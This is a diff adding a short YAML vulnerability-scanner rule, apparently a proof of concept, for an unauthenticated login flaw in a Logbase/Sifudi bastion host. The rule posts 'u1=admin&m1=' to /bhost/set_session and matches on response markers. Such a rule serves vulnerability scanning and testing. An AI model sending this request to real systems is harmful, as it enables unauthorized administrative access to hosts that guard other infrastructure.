@@ -1,0 +1,17 @@
+name: Logbase-unauthorized-Login
+rules:
+  - method: POST
+    path: /bhost/set_session
+    headers:
+      User-Agent: >-
+        Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+        like Gecko) Chrome/86.0.4240.111 Safari/537.36
+    body: u1=admin&m1=
+    follow_redirects: false
+    expression: >
+      response.status==200 && response.body.bcontains(b'ErrMsg') &&
+      response.body.bcontains(b'result')
+detail:
+    author: zhibing
+    links:
+        - https://github.com/zhibx/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md
